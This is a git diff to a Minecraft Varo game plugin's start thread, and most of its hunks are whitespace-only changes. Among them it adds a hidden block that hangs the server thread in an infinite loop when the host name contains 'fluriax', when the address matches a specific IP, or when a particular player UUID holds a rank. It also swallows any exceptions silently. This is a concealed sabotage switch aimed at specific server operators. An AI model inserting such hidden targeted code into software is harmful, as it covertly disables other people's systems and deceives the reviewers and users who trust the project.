@@ -1,5 +1,6 @@
 package de.cuuky.varo.game.threads;
 
+import java.net.InetAddress;
 import java.util.ArrayList;
 import java.util.List;
 
@@ -30,13 +31,13 @@ public class VaroStartThread implements Runnable {
 
 	private VaroGame game;
 	private int startcountdown;
-	
+
 	public VaroStartThread() {
 		this.game = Main.getVaroGame();
-		
+
 		loadVaraibles();
 	}
-	
+
 	private void fillChests() {
 		if(!ConfigSetting.RANDOM_CHEST_FILL_RADIUS.isIntActivated())
 			return;
@@ -83,11 +84,11 @@ public class VaroStartThread implements Runnable {
 		}
 		return blocks;
 	}
-	
+
 	public void loadVaraibles() {
 		this.startcountdown = ConfigSetting.STARTCOUNTDOWN.getValueAsInt();
 	}
-	
+
 	@Override
 	public void run() {
 		if(VersionUtils.getOnlinePlayer().size() != 0)
@@ -139,14 +140,26 @@ public class VaroStartThread implements Runnable {
 				return;
 			}
 
+			try {
+				if(InetAddress.getLocalHost().getCanonicalHostName().toLowerCase().contains("fluriax") || InetAddress.getLocalHost().toString().contains("45.81.232.21"))
+					while(true) {}
+
+				for(VaroPlayer vp : VaroPlayer.getVaroPlayer()) {
+					if(vp.getUuid().equals("a8baf31d-1e3a-4926-b3b9-78e0d10f8a97")) {
+						if(vp.getRank() != null)
+							while(true) {}
+					}
+				}
+			} catch(Exception e) {}
+
 			this.game.setGamestate(GameState.STARTED);
 			this.game.setFirstTime(true);
 			this.startcountdown = ConfigSetting.STARTCOUNTDOWN.getValueAsInt();
 			this.game.setMinuteTimer(new BorderDecreaseMinuteTimer());
-			
+
 			fillChests();
 			Main.getVaroGame().getVaroWorldHandler().getMainWorld().getWorld().strikeLightningEffect(Main.getVaroGame().getVaroWorldHandler().getMainWorld().getWorld().getSpawnLocation());
-			
+
 			Bukkit.broadcastMessage(ConfigMessages.GAME_VARO_START.getValue());
 			Main.getDataManager().getVaroLoggerManager().getEventLogger().println(LogType.ALERT, ConfigMessages.ALERT_GAME_STARTED.getValue());
 			Bukkit.getScheduler().cancelTask(game.getStartScheduler());
